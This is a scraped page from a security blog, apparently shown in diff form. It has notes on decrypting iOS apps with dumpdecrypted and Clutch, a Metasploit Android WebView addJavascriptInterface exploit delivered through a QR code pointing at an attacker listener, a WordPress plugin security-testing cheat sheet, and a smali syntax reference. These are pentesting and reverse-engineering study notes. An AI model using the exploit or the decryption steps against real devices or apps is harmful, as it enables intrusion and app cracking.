-<h3 id="0x02-dumpdecrypted-unpack"><a href="#0x02-dumpdecrypted-unpack" class="headerlink" title="0x02 dumpdecrypted unpack"></a>0x02 dumpdecrypted unpack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ ps -e | grep var</span><br><span class="line">iPhone5S:~ cycript -p pid</span><br><span class="line"># [[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0]</span><br><span class="line">#&quot;file:///var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/Documents&quot;</span><br><span class="line">&gt; scp dumpdecrypted.dylib root@10.0.250.10:/var/mobile/Applications/F2842AA9-F</span><br><span class="line">082-4EA1-8FAD-97BBAAA84D8F/Documents/dumpdecrypted.dylib</span><br><span class="line">iPhone5S:~ /var/mobile/Applications/F2842AA9-F</span><br><span class="line">082-4EA1-8FAD-97BBAAA84D8F/Documents/ root# DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/M1IPhone.app/M1IPhone</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">objc[64669]: Class LocalAccount is implemented in both /System/Library/PrivateFrameworks/Message.framework/Message and /var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/M1IPhone.app/M1IPhone. One of the two will be used. Which one is undefined.</span><br><span class="line">mach-o decryption dumper</span><br><span class="line"></span><br><span class="line">DISCLAIMER: This tool is only meant for security research purposes, not for application crackers.</span><br><span class="line"></span><br><span class="line">[+] detected 64bit ARM binary in memory.</span><br><span class="line">[+] offset to cryptid found: @0x100014c08(from 0x100014000) = c08</span><br><span class="line">[+] Found encrypted data at address 00004000 of length 8798208 bytes - type 1.</span><br><span class="line">[+] Opening /private/var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/M1IPhone.app/M1IPhone for reading.</span><br><span class="line">[+] Reading header</span><br><span class="line">[+] Detecting header type</span><br><span class="line">[+] Executable is a FAT image - searching for right architecture</span><br><span class="line">[+] Correct arch is at offset 10600448 in the file</span><br><span class="line">[+] Opening M1IPhone.decrypted for writing.</span><br><span class="line">[+] Copying the not encrypted start of the file</span><br><span class="line">[+] Dumping the decrypted data into the file</span><br><span class="line">[+] Copying the not encrypted remainder of the file</span><br><span class="line">[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a1cc08</span><br><span class="line">[+] Closing original file</span><br><span class="line">[+] Closing dump file</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:/var/mobile/Applications/B2497E64-F422-4C0F-A3B3-C6129E18E362/Documents root# ls</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File/                       httpCache/                                       syssetting.sqlite-shm</span><br><span class="line">M1IPhone.decrypted          seeyondb.db                                      syssetting.sqlite-wal</span><br><span class="line">MobileWebsite.plist         serverID864d0587fe654e5298adf39cc1c3ad19.sqlite</span><br><span class="line">dumpdecrypted.dylib*  syssetting.sqlite</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; scp root@10.0.250.19:/var/root/M1Iphone.decrypted ./</span><br><span class="line">&gt; class-dump -H M1Iphone.decrypted -o head</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ABNewPersonViewControllerDelegate-Protocol.h                      SyGetMEdocListRequest.h</span><br><span class="line">ABPeoplePickerNavigationControllerDelegate-Protocol.h             SyGetMEdocListResponse.h</span><br><span class="line">AJOKeyPath.h                                                      SyGetMFeedbackListBiz.h</span><br><span class="line">AMCArrayMutableProtocol-Protocol.h                                SyGetMFeedbackListBizParam.h</span><br><span class="line">AMCArrayProtocol-Protocol.h                                       SyGetMFeedbackListRequest.h</span><br><span class="line">AMCHashMutableProtocol-Protocol.h                                 SyGetMFeedbackListResponse.h</span><br><span class="line">AMCHashProtocol-Protocol.h                                        SyGetMMeetingCountRequest.h</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-Clutch-unpack"><a href="#0x03-Clutch-unpack" class="headerlink" title="0x03 Clutch unpack"></a>0x03 Clutch unpack</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# Clutch -i</span><br><span class="line"></span><br><span class="line">Installed apps:</span><br><span class="line">1:   Uber &lt;com.ubercab.UberClient&gt;</span><br><span class="line">2:   QQ &lt;com.tencent.mqq&gt;</span><br><span class="line">3:   微信 &lt;com.tencent.xin&gt;</span><br><span class="line"></span><br><span class="line">iPhone5S:~ root# Clutch -d 1</span><br><span class="line"></span><br><span class="line">Zipping UberClient.app</span><br><span class="line">Swapping architectures..</span><br><span class="line">ASLR slide: 0x8f000</span><br><span class="line">Dumping &lt;UberClient&gt; (armv7)</span><br><span class="line">Patched cryptid (32bit segment)</span><br><span class="line">Writing new checksum</span><br><span class="line">ASLR slide: 0x1000fc000</span><br><span class="line">Dumping &lt;XueBa&gt; (arm64)</span><br><span class="line">Patched cryptid (64bit segment)</span><br><span class="line">Writing new checksum</span><br><span class="line">DONE: /private/var/mobile/Documents/Dumped/com.UberClient-iOS7.0-(Clutch-2.0.4).ipa</span><br><span class="line">Finished dumping com.wenba.bangbang in 19.6 seconds</span><br><span class="line"></span><br><span class="line">iPhone5S:~ root# class-dump -H /Applications/UberClient.app -o /var/root/dump/UberClient-dump</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-weak-classdump-unpack"><a href="#0x04-weak-classdump-unpack" class="headerlink" title="0x04 weak_classdump unpack"></a>0x04 weak_classdump unpack</h3><p><strong>download</strong> <a href="https://github.com/limneos/weak_classdump" target="_blank" rel="external">weak_classdump</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# cycript -p Skype weak_classdump.cy; cycript -p Skype</span><br><span class="line"></span><br><span class="line">&apos;Added weak_classdump to &quot;Skype&quot; (1685)&apos;</span><br><span class="line"></span><br><span class="line">#cy weak_classdump_bundle([NSBundle mainBundle],&quot;/tmp/MobilePhone&quot;)</span><br></pre></td></tr></table></figure></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/01/Attacks-on-Android-WebViews/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/10/01/Attacks-on-Android-WebViews/" itemprop="url">
-                  Attacks on Android WebViews
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-01T01:12:36+08:00">
-                2016-10-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/android/browser/webview_addjavascriptinterface</span><br><span class="line">&gt; set LHOST 192.168.0.110</span><br><span class="line">&gt; exploit</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/xl7dev</span><br><span class="line">[*] Local IP: http://192.168.0.110:8080/xl7dev</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-QR-Code-Attack"><a href="#0x02-QR-Code-Attack" class="headerlink" title="0x02 QR Code Attack"></a>0x02 QR Code Attack</h3><blockquote>
-<p>qr “<a href="http://192.168.0.110:8080/xl7dev" target="_blank" rel="external">http://192.168.0.110:8080/xl7dev</a>“</p>
-</blockquote>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/28/WordPress-Plugin-Security-Testing-Cheat-Sheet/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/28/WordPress-Plugin-Security-Testing-Cheat-Sheet/" itemprop="url">
-                  WordPress Plugin Security Testing Cheat Sheet
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-28T12:27:46+08:00">
-                2016-09-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-XSS"><a href="#0x01-XSS" class="headerlink" title="0x01 XSS"></a>0x01 XSS</h3><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_REQUEST</span><br><span class="line">$_SERVER[&apos;REQUEST_URI&apos;]</span><br><span class="line">$_SERVER[&apos;PHP_SELF&apos;]</span><br><span class="line">$_SERVER[&apos;HTTP_REFERER&apos;]</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>
-<h4 id="Unsafe-API-functions"><a href="#Unsafe-API-functions" class="headerlink" title="Unsafe API functions"></a>Unsafe API functions</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_query_arg()</span><br><span class="line">remove_query_arg()</span><br></pre></td></tr></table></figure>
-<p>Reference: <a href="https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html" target="_blank" rel="external">https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html</a></p>
-<h4 id="Disallow-unfilterd-html"><a href="#Disallow-unfilterd-html" class="headerlink" title="Disallow unfilterd html"></a>Disallow unfilterd html</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define( &apos;DISALLOW_UNFILTERED_HTML&apos;, true );</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-SQL-Injection"><a href="#0x02-SQL-Injection" class="headerlink" title="0x02 SQL Injection"></a>0x02 SQL Injection</h3><h4 id="Unsafe-API-methods-require-sanitising-escaping"><a href="#Unsafe-API-methods-require-sanitising-escaping" class="headerlink" title="Unsafe API methods (require sanitising/escaping)"></a>Unsafe API methods (require sanitising/escaping)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wpdb-&gt;query()</span><br><span class="line">$wpdb-&gt;get_var()</span><br><span class="line">$wpdb-&gt;get_row()</span><br><span class="line">$wpdb-&gt;get_col()</span><br><span class="line">$wpdb-&gt;get_results()</span><br><span class="line">$wpdb-&gt;replace()</span><br></pre></td></tr></table></figure>
-<h4 id="Safe-API-methods-according-to-WordPress"><a href="#Safe-API-methods-according-to-WordPress" class="headerlink" title="Safe API methods (according to WordPress)"></a>Safe API methods (according to WordPress)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$wpdb-&gt;insert()</span><br><span class="line">$wpdb-&gt;update()</span><br><span class="line">$wpdb-&gt;delete()</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Safe code</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sql = $wpdb-&gt;prepare( &apos;query&apos; , value_parameter[, value_parameter ... ] ); ?&gt;</span><br></pre></td></tr></table></figure>
-<p>####Unsafe escaping (‘securing’) API methods</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">esc_sql()</span><br><span class="line">escape()</span><br><span class="line">esc_like()</span><br><span class="line">like_escape()</span><br></pre></td></tr></table></figure>
-<h4 id="Displaying-hiding-SQL-errors"><a href="#Displaying-hiding-SQL-errors" class="headerlink" title="Displaying/hiding SQL errors"></a>Displaying/hiding SQL errors</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $wpdb-&gt;show_errors(); ?&gt; </span><br><span class="line">&lt;?php $wpdb-&gt;hide_errors(); ?&gt; </span><br><span class="line">&lt;?php $wpdb-&gt;print_error(); ?&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-File-Inclusion"><a href="#0x03-File-Inclusion" class="headerlink" title="0x03 File Inclusion"></a>0x03 File Inclusion</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include()</span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-PHP-Object-Injection"><a href="#0x04-PHP-Object-Injection" class="headerlink" title="0x04 PHP Object Injection"></a>0x04 PHP Object Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize()</span><br></pre></td></tr></table></figure>
-<h3 id="0x05-Authorisation"><a href="#0x05-Authorisation" class="headerlink" title="0x05 Authorisation"></a>0x05 Authorisation</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_admin()</span><br><span class="line">is_user_admin()</span><br><span class="line">current_user_can()</span><br></pre></td></tr></table></figure>
-<h3 id="0x06-Open-Redirect"><a href="#0x06-Open-Redirect" class="headerlink" title="0x06 Open Redirect"></a>0x06 Open Redirect</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp_redirect()</span><br></pre></td></tr></table></figure>
-<h3 id="0x07-CSRF"><a href="#0x07-CSRF" class="headerlink" title="0x07 CSRF"></a>0x07 CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wp_nonce_field()</span><br><span class="line">wp_nonce_url()</span><br><span class="line">wp_verify_nonce()</span><br><span class="line">check_admin_referer()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/22/smali-wiki/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/22/smali-wiki/" itemprop="url">
-                  smali wiki
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-22T15:08:16+08:00">
-                2016-09-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-TypesMethodsAndFields"><a href="#0x01-TypesMethodsAndFields" class="headerlink" title="0x01 TypesMethodsAndFields"></a>0x01 TypesMethodsAndFields</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><blockquote>
-<p><strong>原始类型</strong></p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>value</th>
-<th>description </th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>V</td>
-<td>void - can only be used for return types</td>
-</tr>
-<tr>
-<td>Z</td>
-<td>boolean</td>
-</tr>
-<tr>
-<td>B</td>
-<td>byte</td>
-</tr>
-<tr>
-<td>S</td>
-<td>short</td>
-</tr>
-<tr>
-<td>C</td>
-<td>char</td>
-</tr>
-<tr>
-<td>I</td>
-<td>int</td>
-</tr>
-<tr>
-<td>J</td>
-<td>long (64 bits)</td>
-</tr>
-<tr>
-<td>F</td>
-<td>float</td>
-</tr>
-<tr>
-<td>D</td>
-<td>double (64 bits)</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p><strong>对象</strong></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;   &lt;==&gt; package.name.ObjectName;</span><br></pre></td></tr></table></figure>
-<table>
-<thead>
-<tr>
-<th>value</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>L</td>
-<td>表示这是一个对象类型</td>
-</tr>
-<tr>
-<td>package/name</td>
-<td>该对象所在的包</td>
-</tr>
-<tr>
-<td>ObjectName</td>
-<td>对象名称</td>
-</tr>
-<tr>
-<td>;</td>
-<td>标识对象名称的结束</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p><strong>数组</strong></p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[|          ==&gt; 表示一个int型的一维数组，相当于int[]</span><br><span class="line">[[|         ==&gt; int[][]，数组每一个维度最多255个;</span><br><span class="line">对象数组    ==&gt; 如String数组的表示是[Ljava/lang/String</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><strong>寄存器与变量</strong></p>
-</blockquote>
-<p>寄存器采用v和p来命名,v表示本地寄存器,p表示参数寄存器,如果一个方法有两个本地变量，有三个参数:</p>
-<table>
-<thead>
-<tr>
-<th>var</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>v0</td>
-<td>第一个本地寄存器</td>
-</tr>
-<tr>
-<td>v1</td>
-<td>第二个本地寄存器</td>
-</tr>
-<tr>
-<td>v2</td>
-<td>p0 (this)</td>
-</tr>
-<tr>
-<td>v3</td>
-<td>p1 第一个参数</td>
-</tr>
-<tr>
-<td>v4</td>
-<td>p2 第二个参数</td>
-</tr>
-<tr>
-<td>v5</td>
-<td>p3 第三个参数</td>
-</tr>
-</tbody>
-</table>
-<p>＊如果是静态方法的话就只有5个寄存器了，不需要存this了。</p>
-<p>.registers 使用这个指令指定方法中寄存器的总数</p>
-<p>.locals 使用这个指定表明方法中非参寄存器的总数，放在方法的第一行。</p>
-<h4 id="方法和字段"><a href="#方法和字段" class="headerlink" title="方法和字段"></a>方法和字段</h4><blockquote>
-<p><strong>方法签名</strong></p>
-</blockquote>
-<p>methodName(III)Lpackage/name/ObjectName;</p>
-<table>
-<thead>
-<tr>
-<th>var</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>methodName</td>
-<td>方法名</td>
-</tr>
-<tr>
-<td>III</td>
-<td>三个整形参数</td>
-</tr>
-<tr>
-<td>Lpackage/name/ObjectName;</td>
-<td>返回值的类型</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p><strong>方法</strong></p>
-</blockquote>
-<p>Lpackage/name/ObjectName;——&gt;methodName(III)Z    ==&gt; function boolean methondName(int a, int b, int c)</p>
-<blockquote>
-<p><strong>字段</strong></p>
-</blockquote>
-<p>Lpackage/name/ObjectName;——&gt;FieldName:Ljava/lang/String;</p>
-<table>
-<thead>
-<tr>
-<th>var</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Lpackage/name/ObjectName;</td>
-<td>包名</td>
-</tr>
-<tr>
-<td>FieldName</td>
-<td>字段名</td>
-</tr>
-<tr>
-<td>Ljava/lang/String;</td>
-<td>字段类型</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p><strong>方法的定义</strong></p>
-</blockquote>
-<p><strong>编译前</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static int sum(int a, int b) &#123;</span><br><span class="line">        return a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><strong>编译后</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.method private static sum(II)I</span><br><span class="line">    .locals 4   #表示需要申请4个本地寄存器</span><br><span class="line">    .parameter</span><br><span class="line">    .parameter #这里表示有两个参数</span><br><span class="line">    .prologue</span><br><span class="line">    .line 27 </span><br><span class="line">    move v0, p0</span><br><span class="line">    .local v0, a:I</span><br><span class="line">    move v1, p1</span><br><span class="line">    .local v1, b:I</span><br><span class="line">    move v2, v0</span><br><span class="line">    move v3, v1</span><br><span class="line">    add-int/2addr v2, v3</span><br><span class="line">    move v0, v2</span><br><span class="line">    .end local v0           #a:I</span><br><span class="line">    return v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure></p>
-<p>函数声明使用.method开始 .end method结束，java中的关键词private,static 等都可以使用，同时使用sum(II)I签名来表示唯一的方法</p>
-<blockquote>
-<p><strong>声明成员</strong></p>
-</blockquote>
-<p>.field private name:Lpackage/name/ObjectName;</p>
-<table>
-<thead>
-<tr>
-<th>var</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>private TextView mTextView;</td>
-<td>.field private mTextView:Landroid/widget/TextView;</td>
-</tr>
-<tr>
-<td>private int mCount;</td>
-<td>.field private mCount:I</td>
-</tr>
-</tbody>
-</table>
-<blockquote>
-<p><strong>指令执行</strong></p>
-</blockquote>
-<p>example:</p>
-<p>move v0, v3     #把v3寄存器的值移动到寄存器v0上</p>
-<p>const v0, 0x1  #把值0x1赋值到寄存器v0上</p>
-<p>invoke-static {v4, v5}, Lme/isming/myapplication/MainActivity;-&gt;sum(II)I    </p>
-<p>#执行方法sum(),v4,v5的值分别作为sum的参数</p>
-<h3 id="0x02-smali基本语法"><a href="#0x02-smali基本语法" class="headerlink" title="0x02 smali基本语法"></a>0x02 smali基本语法</h3><table>
-<thead>
-<tr>
-<th>value</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>.field private isFlag:z　</td>
-<td>　定义变量</td>
-</tr>
-<tr>
-<td>.method　</td>
-<td>　方法</td>
-</tr>
-<tr>
-<td>.parameter　</td>
-<td>　方法参数</td>
-</tr>
-<tr>
-<td>.prologue　</td>
-<td>　方法开始</td>
-</tr>
-<tr>
-<td>.line 12　</td>
-<td>　此方法位于第12行</td>
-</tr>
-<tr>
-<td>invoke-super　</td>
-<td>　调用父函数</td>
-</tr>
-<tr>
-<td>const/high16  v0, 0x7fo3　</td>
-<td>　把0x7fo3赋值给v0</td>
-</tr>
-<tr>
-<td>invoke-direct　</td>
-<td>　调用函数</td>
-</tr>
-<tr>
-<td>return-void　</td>
-<td>　函数返回void</td>
-</tr>
-<tr>
-<td>.end method　</td>
-<td>　函数结束</td>
-</tr>
-<tr>
-<td>new-instance　</td>
-<td>　创建实例</td>
-</tr>
-<tr>
-<td>iput-object　</td>
-<td>　对象赋值</td>
-</tr>
-<tr>
-<td>iget-object　</td>
-<td>　调用对象</td>
-</tr>
-<tr>
-<td>invoke-static　</td>
-<td>　调用静态函数</td>
-</tr>
-</tbody>
-</table>
